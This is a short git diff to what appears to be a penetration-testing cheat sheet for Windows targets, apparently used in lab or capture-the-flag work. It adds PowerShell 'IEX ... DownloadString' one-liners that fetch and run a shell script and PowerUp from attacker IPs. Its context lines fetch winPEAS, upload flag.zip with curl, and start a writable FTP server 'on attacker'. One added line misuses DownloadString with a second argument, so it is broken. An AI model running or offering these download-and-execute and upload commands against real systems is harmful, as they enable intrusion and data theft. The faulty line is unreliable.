@@ -65,10 +65,13 @@ C:\Windows\SysWOW64\Tasks\Microsoft\Windows\PLA\System
 
 ## Powershell
 ```powershell
-Powershell "IEX(New-Object Net.WebClient).downloadString('http://10.10.16.8/prettysafe.ps1')"
+# Download and execute files
+Powershell "IEX(New-Object Net.WebClient).downloadString('http://10.10.16.19/shell.ps1')"
 
 IEX(New-Object Net.WebClient).downloadString('http://10.10.16.8/PowerUp.ps1')
 
+# download files
+IEX(New-Object Net.WebClient).downloadString('http://10.10.16.8/PowerUp.ps1','powerup.ps1')
 Invoke-WebRequest -Uri 10.10.16.4/winpeas.bat -OutFile winpeas.bat
 
 IWR -Uri http://10.10.10.10/winpeas.bat -OutFile winpeas.bat
@@ -146,7 +149,7 @@ curl 192.77.184.2 --upload-file flag.zip
 
 # FTP
 ```
-python -m pyftpdlib 21
+python -m pyftpdlib -p 21 --write # on attacker
 ftp 10.10.10.10
 ```
 
